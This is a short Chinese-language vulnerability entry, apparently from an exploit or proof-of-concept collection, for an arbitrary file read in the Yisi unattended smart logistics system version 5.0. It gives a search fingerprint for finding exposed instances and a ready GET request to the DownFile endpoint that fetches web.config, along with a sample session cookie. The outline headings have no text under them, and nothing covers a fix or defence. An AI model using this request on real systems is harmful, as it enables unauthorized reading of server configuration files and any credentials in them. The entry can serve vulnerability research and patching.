# 易思智能物流无人值守系统downfile文件读取漏洞

- **系统**：易思智能物流无人值守系统downfile　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.body=="易思无人值守智能物流"`
- **请求**：`GET /PublicInfoManage/Upload/DownFile?filePath=web.config  HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=c5z5wepqulqppvdagvif5dlv`

**请求体 / payload**
```

```

**其他**
- 易思智能物流无人值守系统downfile文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 易思智能物流无人值守系统5.0